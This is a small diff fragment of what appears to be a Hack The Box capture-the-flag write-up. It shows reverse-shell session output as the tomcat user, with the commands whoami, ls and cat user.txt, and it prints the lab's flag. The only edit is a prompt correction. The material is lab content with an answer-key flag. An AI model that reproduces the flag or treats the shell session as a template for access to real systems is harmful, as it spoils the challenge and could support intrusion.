@@ -165,11 +165,11 @@ connect to [10.10.14.10] from (UNKNOWN) [10.129.173.138] 48794
 tomcat@manager:/$ whoami
 whoami
 tomcat
-tomcat@manager:~$ ls ~
+tomcat@manager:/$ ls ~
 ls ~
 accessmanager  conf    lib   openam  user.txt  work
 bin            config  logs  temp    webapps
-tomcat@manager:~$ cat user.txt  
+tomcat@manager:/$ cat user.txt  
 cat user.txt
 HTB{1n53cur3_d353r14l1z4710n_c4n_b3_v3ry_d4n63r0u5}
 ```
